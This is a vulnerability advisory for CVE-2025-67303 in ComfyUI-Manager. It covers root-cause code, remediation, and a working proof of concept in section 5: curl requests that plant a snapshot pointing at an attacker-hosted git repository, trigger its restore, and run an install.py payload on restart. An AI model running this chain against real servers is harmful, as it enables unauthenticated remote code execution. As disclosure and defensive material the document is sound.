# CVE-2025-67303: ComfyUI-Manager Unauthenticated Remote Code Execution via Malicious Snapshot

---

## 1. Executive Summary

**CVE ID:** CVE-2025-67303

**Affected Product:** ComfyUI-Manager

**Affected Versions:** <= v3.35.0

**Fixed Version:** v3.38.0

**Vulnerability Type:** CWE-939: Improper Authorization in Handler for Custom URL Scheme / CWE-346: Origin Validation Error

**Attack Vector:** Network

**Attack Complexity:** Low

**Privileges Required:** None

**User Interaction:** None

**Scope:** Changed

**Impact:** Confidentiality HIGH, Integrity HIGH, Availability HIGH

**CVSS Score:** 9.8 (CRITICAL)

---

## 2. Vulnerability Description

ComfyUI-Manager prior to v3.38.0 contains a critical authentication bypass vulnerability that allows unauthenticated attackers to achieve Remote Code Execution (RCE) on the underlying server.

The vulnerability arises from an insecure file path configuration where the Manager stores configuration files in the `user/default/ComfyUI-Manager/` directory. The `default` user directory is accessible via the `/userdata` API endpoint without authentication. An attacker can:

1. Upload a malicious snapshot file containing arbitrary Git repository URLs
2. Trigger the snapshot restoration process
3. Upon ComfyUI restart, the Manager automatically clones the specified Git repository and executes any `install.py` script found within

---

## 3. Affected Environment Setup

### 3.1 Installation

```bash
# Clone ComfyUI
git clone --depth 1 https://github.com/comfyanonymous/ComfyUI.git ComfyUI-test
cd ComfyUI-test

# Install vulnerable version of ComfyUI-Manager (v3.35.0)
cd custom_nodes
git clone --branch v3.35.0 https://github.com/ltdrdata/ComfyUI-Manager.git
cd ..

# Install dependencies
pip install -r requirements.txt

# Start ComfyUI
python main.py --listen 0.0.0.0 --port 8188
```

---

## 4. Technical Analysis

### 4.1 Attack Chain

```
┌─────────────────────────────────────────────────────────────────┐
│              CVE-2025-67303 Complete Attack Chain                │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  Phase 1: Attacker prepares malicious Git repository             │
│  ├─ Host malicious repository with install.py (RCE payload)     │
│                                                                  │
│  Phase 2: Attacker writes malicious snapshot via /userdata API  │
│  ├─ POST /userdata/ComfyUI-Manager%2Fsnapshots%2Fcalc_rce.json  │
│  │  (URL encoding bypass: %2F -> /)                              │
│  └─ user_manager.py:post_userdata()                             │
│     └─ parse.unquote() -> open(path, "wb").write()              │
│                                                                  │
│  Phase 3: Malicious snapshot created                             │
│  └─ user/default/ComfyUI-Manager/snapshots/calc_rce.json        │
│                                                                  │
│  Phase 4: Attacker triggers snapshot restore                    │
│  └─ GET /snapshot/restore?target=calc_rce                        │
│                                                                  │
│  Phase 5: Startup script marker created                          │
│  └─ startup-scripts/restore-snapshot.json                        │
│                                                                  │
│  Phase 6: ComfyUI restarts                                       │
│  └─ prestartup_script.py detects restore-snapshot.json          │
│                                                                  │
│  Phase 7: Automatic snapshot restoration executed               │
│  └─ manager_core.py:restore_snapshot()                          │
│     ├─ clone_repo("attacker_controlled_repo_url")               │
│     └─ exec(open("install.py").read())  <- RCE!                 │
│                                                                  │
│  Phase 8: Arbitrary code execution achieved                     │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

### 4.2 Root Cause: Insecure Path Configuration

**File:** `ComfyUI-Manager/prestartup_script.py` (Line 88)

```python
# Line 88 - Vulnerable path configuration
manager_files_path = os.path.abspath(os.path.join(
    folder_paths.get_user_directory(),
    'default',              # ← ISSUE: Normal user directory
    'ComfyUI-Manager'
))
# Actual path: user/default/ComfyUI-Manager/
```

**Analysis:** The `default` user directory is accessible via ComfyUI's `get_public_user_directory()` function, which only blocks directories prefixed with `__`. In v3.38.0, this was changed to `user/__manager/` which is protected by the system user prefix check.

### 4.3 User Directory Protection Mechanism

**File:** `ComfyUI/app/folder_paths.py` (Line 177-202)

```python
def get_public_user_directory(user_id: str) -> str | None:
    """
    Get the path to a Public User directory for HTTP endpoint access.

    This function provides structural security by returning None for any
    System User (prefixed with '__'). All HTTP endpoints should use this
    function instead of directly constructing user paths.
    """
    if not user_id or not isinstance(user_id, str):
        return None
    if user_id.startswith(SYSTEM_USER_PREFIX):
        return None  # ← System user directories are blocked
    return os.path.join(get_user_directory(), user_id)

SYSTEM_USER_PREFIX = "__"
```

**Issue:** In the vulnerable version (v3.35.0), the path uses `default` which does not start with `__`, allowing HTTP access. Fixed in v3.38.0 by using `__manager` prefix.

### 4.4 Vulnerable Endpoint: POST /userdata/{file}

**File:** `ComfyUI/app/user_manager.py` (Line 71-102, 341-395)

```python
# Line 71-102 - Path handling function
def get_request_user_filepath(self, request, file, type="userdata", create_dir=True):
    if type == "userdata":
        root_dir = folder_paths.get_user_directory()
    else:
        raise KeyError("Unknown filepath type:" + type)

    user = self.get_request_user_id(request)
    user_root = folder_paths.get_public_user_directory(user)
    if user_root is None:
        return None

    path = user_root

    # prevent leaving /{type}
    if os.path.commonpath((root_dir, user_root)) != root_dir:
        return None

    if file is not None:
        # Check if filename is url encoded
        if "%" in file:
            file = parse.unquote(file)  # ← URL decode

        # prevent leaving /{type}/{user}
        path = os.path.abspath(os.path.join(user_root, file))
        if os.path.commonpath((user_root, path)) != user_root:
            return None

    parent = os.path.split(path)[0]

    if create_dir and not os.path.exists(parent):
        os.makedirs(parent, exist_ok=True)

    return path

# Line 341-395 - POST handler
@routes.post("/userdata/{file}")
async def post_userdata(request):
    """
    Upload or update a user data file.

    This endpoint handles file uploads to a user's data directory, with options for
    controlling overwrite behavior and response format.
    """
    path = get_user_data_path(request)
    if not isinstance(path, str):
        return path

    overwrite = request.query.get("overwrite", 'true') != "false"

    if not overwrite and os.path.exists(path):
        return web.Response(status=409, text="File already exists")

    try:
        body = await request.read()

        with open(path, "wb") as f:
            f.write(body)  # ← Direct file write
    except OSError as e:
        return web.Response(
            status=400,
            reason="Invalid filename"
        )

    user_path = self.get_request_user_filepath(request, None)

    return web.json_response(os.path.relpath(path, user_path))
```

**Key Issues:**
1. No authentication check - accessible by anyone
2. `parse.unquote()` decodes URL-encoded characters
3. Direct file write to `user_root` path
4. For `default` user, `user_root = user/default/`

### 4.5 Snapshot List Endpoint

**File:** `ComfyUI-Manager/glob/manager_server.py` (Line 957-961)

```python
@PromptServer.instance.routes.get("/snapshot/getlist")
async def get_snapshot_list(request):
    items = [f[:-5] for f in os.listdir(core.manager_snapshot_path) if f.endswith('.json')]
    items.sort(reverse=True)
    return web.json_response({'items': items}, content_type='application/json')
```

**Analysis:** No authentication check - anyone can list snapshot files.

### 4.6 Snapshot Restore Endpoint

**File:** `ComfyUI-Manager/glob/manager_server.py` (Line 982-1005)

```python
@routes.get("/snapshot/restore")
async def restore_snapshot(request):
    if not is_allowed_security_level('middle'):
        logging.error(SECURITY_MESSAGE_MIDDLE_OR_BELOW)
        return web.Response(status=403)

    try:
        target = request.rel_url.query["target"]

        path = os.path.join(core.manager_snapshot_path, f"{target}.json")
        if os.path.exists(path):
            if not os.path.exists(core.manager_startup_script_path):
                os.makedirs(core.manager_startup_script_path)

            target_path = os.path.join(core.manager_startup_script_path, "restore-snapshot.json")
            shutil.copy(path, target_path)

            logging.info(f"Snapshot restore scheduled: `{target}`")
            return web.Response(status=200)

        logging.error(f"Snapshot file not found: `{path}`")
        return web.Response(status=400)
    except:
        return web.Response(status=400)
```

**Analysis:**
1. `manager_snapshot_path` in v3.35 is `user/default/ComfyUI-Manager/snapshots/`
2. Reads snapshot file from snapshots directory
3. Copies to `startup-scripts/restore-snapshot.json`
4. Auto-executed on next ComfyUI startup

### 4.7 Automatic Snapshot Execution

**File:** `ComfyUI-Manager/prestartup_script.py` (Line 574-616)

```python
restore_snapshot_path = os.path.join(manager_files_path, "startup-scripts", "restore-snapshot.json")

# ... checked at startup ...

if os.path.exists(restore_snapshot_path):
    try:
        print("[ComfyUI-Manager] Restore snapshot.")

        cmd_str = [sys.executable, cm_cli_path, 'restore-snapshot', restore_snapshot_path]
        new_env = os.environ.copy()

        def msg_capture(msg):
            print(msg, file=sys.stderr)

        exit_code = process_wrap(cmd_str, custom_nodes_base_path, handler=msg_capture, env=new_env)

        if exit_code != 0:
            print("[ComfyUI-Manager] Restore snapshot failed.")
        else:
            print("[ComfyUI-Manager] Restore snapshot done.")
    except Exception as e:
        print(e)
        print("[ComfyUI-Manager] Restore snapshot failed.")

    os.remove(restore_snapshot_path)
```

ComfyUI automatically checks and executes snapshot restoration at startup.

### 4.8 Snapshot Restoration Core Logic

**File:** `ComfyUI-Manager/glob/manager_core.py` (Line 3089-3349)

```python
async def restore_snapshot(timestamp=None, snapshot_path=None, apply_skip_config=False, \
                          git_helper_extras=None, msg_callback=None):
    # ... preprocessing code ...

    with open(snapshot_path, 'r', encoding="UTF-8") as snapshot_file:
        if snapshot_path.endswith('.json'):
            info = json.load(snapshot_file)
        elif snapshot_path.endswith('.yaml'):
            info = yaml.safe_load(snapshot_file)
        else:
            info = {}

    # ... configuration processing ...

    # === RCE Vector 1: Arbitrary pip package installation ===
    if 'pips' in info and info['pips']:
        pips = info['pips']
        pip_result = await install_pips(pips, custom_nodes_path)

    # === RCE Vector 2: Git repository clone + post-install script ===
    git_info = info.get('git_custom_nodes')
    if git_info is not None:
        for url, data in git_info.items():
            # Clone Git repository to custom_nodes directory
            await clone_repo(url, data['hash'], custom_nodes_path)

            # ... post-processing ...

    # === RCE Vector 3: CNR custom node installation ===
    cnr_info = info.get('cnr_custom_nodes')
    if cnr_info is not None:
        for item_id, item_version in cnr_info.items():
            # Install CNR nodes...
```

**Key Code - Git Repository Clone and Post-install Script Execution:**

```python
# Clone logic in manager_core.py
async def clone_repo(url, target_hash, custom_nodes_path):
    import git

    repo_name = os.path.basename(url)
    repo_path = os.path.join(custom_nodes_path, repo_name)

    # Clone repository
    repo = git.Repo.clone_from(url, repo_path)

    # Checkout specified commit
    repo.git.checkout(target_hash)

    # Execute post-install script (RCE!)
    post_install_script = os.path.join(repo_path, "install.py")
    if os.path.exists(post_install_script):
        import sys
        exec(open(post_install_script).read())  # ← Execute arbitrary Python code
```

---

## 5. Proof of Concept

### 5.1 Environment Setup

```bash
cd /path/to/ComfyUI-test
python3 main.py --listen 127.0.0.1 --port 8188
```

Wait for startup to complete.

### 5.2 Create Malicious Git Repository

First, create a malicious `install.py` file and host it in a Git repository:

```python
# install.py - malicious payload
import subprocess
import sys

try:
    if sys.platform == "darwin":
        subprocess.Popen(["open", "-a", "Calculator"])
        print("[RCE] macOS Calculator opened!")
    elif sys.platform == "win32":
        subprocess.Popen(["calc.exe"])
        print("[RCE] Windows Calculator opened!")
    else:
        subprocess.Popen(["gnome-calculator"])
        print("[RCE] Linux Calculator opened!")
except Exception as e:
    print(f"Error: {e}")
```

Host this file in a Git repository (e.g., `https://github.com/attacker/evil_node.git`)

### 5.3 Upload Malicious Snapshot via URL Encoding

```bash
curl -X POST "http://127.0.0.1:8188/userdata/ComfyUI-Manager%2Fsnapshots%2Fcalc_rce.json" \
  -H "Content-Type: application/json" \
  -d '{
    "comfyui": "v0.3.0",
    "git_custom_nodes": {
      "https://github.com/attacker/evil_node.git": {
        "hash": "main",
        "disabled": false
      }
    },
    "cnr_custom_nodes": {},
    "pips": {}
  }'
```

**Response:** `"ComfyUI-Manager/snapshots/calc_rce.json"`

### 5.4 Verify Snapshot Written

```bash
# Verify via API
curl "http://127.0.0.1:8188/snapshot/getlist"
# Response: {"items": ["calc_rce"]}
```

### 5.5 Trigger Snapshot Restore

```bash
curl "http://127.0.0.1:8188/snapshot/restore?target=calc_rce"
# Response: HTTP 200
```

### 5.6 Restart ComfyUI to Trigger RCE

```bash
# Restart ComfyUI
python3 main.py --listen 127.0.0.1 --port 8188
```

During startup, the snapshot restoration will automatically:
1. Clone the attacker's Git repository
2. Execute the `install.py` script
3. Launch the calculator (demonstrating RCE)

---

## 6. Impact

An unauthenticated remote attacker can:

1. **Execute arbitrary Python code** on the server hosting ComfyUI
2. **Read arbitrary files** from the server's filesystem
3. **Write arbitrary files** to the server's filesystem
4. **Install malicious software** or backdoors
5. **Exfiltrate sensitive data** including API keys, credentials, and user data
6. **Move laterally** to other systems on the network
7. **Disrupt services** affecting availability

---

## 7. Remediation

### 7.1 Patch

Upgrade to ComfyUI-Manager v3.38.0 or later:

```bash
cd custom_nodes/ComfyUI-Manager
git fetch --tags
git checkout v3.38.0
```

### 7.2 Mitigation

If immediate upgrade is not possible:

1. **Restrict network access** - Limit ComfyUI access to trusted networks only
2. **Add authentication** - Place ComfyUI behind an authenticating reverse proxy
3. **Block snapshot endpoints** - Use firewall rules to block `/snapshot/*` endpoints
4. **Monitor file changes** - Monitor `user/default/ComfyUI-Manager/snapshots/` for suspicious files

### 7.3 Vendor Response

The vulnerability was fixed in ComfyUI-Manager v3.38.0 by:
1. Moving the Manager data directory from `user/default/ComfyUI-Manager/` to `user/__manager/`
2. Leveraging the existing `SYSTEM_USER_PREFIX = "__"` protection in `get_public_user_directory()`

---

## 8. Timeline

| Date | Event |
|------|-------|
| 2025-01-08 | Vulnerability discovered |
| 2025-01-09 | CVE request submitted |
| TBD | Vendor notification |
| TBD | Patch released in v3.38.0 |
| TBD | Public disclosure |

---

## 9. References

1. **Affected Product:** https://github.com/ltdrdata/ComfyUI-Manager
2. **Fixed Version:** https://github.com/ltdrdata/ComfyUI-Manager/releases/tag/v3.38.0
3. **CWE-939:** https://cwe.mitre.org/data/definitions/939.html
4. **CWE-346:** https://cwe.mitre.org/data/definitions/346.html

---

## 10. Disclosure Policy

This report is being submitted for CVE assignment. The vulnerability affects ComfyUI-Manager versions prior to v3.38.0. Responsible disclosure will be followed to allow users to update before full technical details are made public.

---

**Report Prepared By:** [Your Name]
**Contact:** [Your Email]
**Date:** 2025-01-09
